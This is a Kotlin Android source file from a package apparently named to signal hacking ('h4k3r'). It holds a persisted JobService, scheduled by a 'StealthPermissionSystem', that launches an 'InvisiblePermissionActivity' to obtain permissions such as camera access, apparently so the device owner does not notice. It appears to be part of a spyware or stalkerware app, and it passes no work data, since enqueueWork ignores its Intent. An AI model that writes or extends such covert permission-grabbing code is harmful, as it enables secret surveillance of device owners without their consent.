package com.h4k3r.dreamer

import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * JobService implementation for permission requests
 * This service is scheduled by the StealthPermissionSystem and helps
 * ensure permissions are requested through Android's JobScheduler API
 */
class PermissionJobService : JobService() {
    companion object {
        private const val TAG = "PermissionJobService"
        private const val JOB_ID = 1001

        fun enqueueWork(context: Context, work: Intent) {
            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val jobInfo = JobInfo.Builder(JOB_ID, ComponentName(context, PermissionJobService::class.java))
                .setMinimumLatency(0)
                .setOverrideDeadline(5000)
                .setPersisted(true)
                .build()

            jobScheduler.schedule(jobInfo)
        }
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "PermissionJobService started")
        
        // Handle permission requests in background
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            val permission = params?.extras?.getString("permission") ?: "camera"
            
            val intent = Intent(this, InvisiblePermissionActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("permission", permission)
            }

            try {
                startActivity(intent)
                Log.d(TAG, "Started permission request for: $permission")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start permission activity", e)
            }
        }

        jobFinished(params, false)
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "PermissionJobService stopped")
        // Return true to reschedule this job
        return true
    }
}